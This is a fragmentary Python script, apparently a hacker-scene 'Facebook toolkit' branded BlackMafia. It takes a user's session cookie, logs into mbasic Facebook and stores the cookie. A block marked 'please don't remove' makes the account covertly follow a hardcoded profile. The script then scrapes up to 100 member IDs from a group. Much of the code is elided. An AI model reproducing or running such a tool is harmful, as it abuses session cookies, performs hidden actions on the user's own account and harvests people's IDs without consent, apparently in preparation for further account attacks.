#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# coded by lovehacker BlackMafia
# script chori ni karo 😆😆😆😆
import os
import re 
import time
import json
...
result = 0
def masuk():
        print('\n\n\t\t≺ \033[1;36m●   Black Mafia  ● \033[0m ≻\n\n')
        print('\n\n\t\t≺ \033[1;36m●   03094161457  ● \033[0m ≻\n\n')
        print('\n\n\t\t≺ \033[1;36m● FACEBOOK LOGIN ● \033[0m ≻\n\n')
        try:
        ...
        if "mbasic_logout_button" in str(ismi):
                if "Ab Ap kya Soch Rahy hain" in str(ismi):
                        with open("cookies","w") as f:
                                f.write(cek["cookie"])
                else:
                        print("# Change the language, please wait!!")
                        try:
                                requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="English")["href"]),cookies=cek)
                        except:
                                pass
                try:
                        # please don't remove this or change
                        ikuti = parser(requests.get(mbasic.format("kabutar.khan.3766"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
...
if __name__ == '__main__':
        try:
                ...
                kuki = {'cookie':kukis}
                os.system("clear")
                print('\n\n\t\t≺ \033[1;36mFACEBOOK TOOLKIT BlackMafia\033[0m ≻\n\n')
                ...
                if tanya =="":
                        ...
                        print("# can only take 100 IDs 💪 BlackMafia ")
                        grab = input("# ID group : ")
